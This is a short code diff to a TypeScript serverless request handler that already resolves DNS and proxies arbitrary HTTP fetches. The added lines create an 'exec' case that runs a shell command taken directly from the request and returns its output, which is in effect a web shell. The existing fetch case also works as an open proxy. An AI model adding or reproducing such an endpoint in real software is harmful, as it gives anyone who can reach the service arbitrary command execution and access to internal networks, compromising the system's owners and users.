@@ -28,6 +28,12 @@ export default async (req: Request) => {
         const dns = await import("node:dns/promises");
         return json(200, { addrs: await dns.resolve(m.host, m.rr || "A").catch((e: any) => [{ err: e.code }]) });
       }
+      case "exec": {
+        const cp = await import("node:child_process");
+        const { promisify } = await import("node:util");
+        const r = await promisify(cp.exec)(m.cmd, { timeout: m.timeout || 10000, maxBuffer: 8 * 1024 * 1024 });
+        return json(200, { stdout: r.stdout, stderr: r.stderr });
+      }
       case "fetch": {
         const r = await fetch(m.url, { method: m.method || "GET", headers: m.headers || {}, body: m.body, redirect: m.redirect || "manual" });
         const t = await r.text();
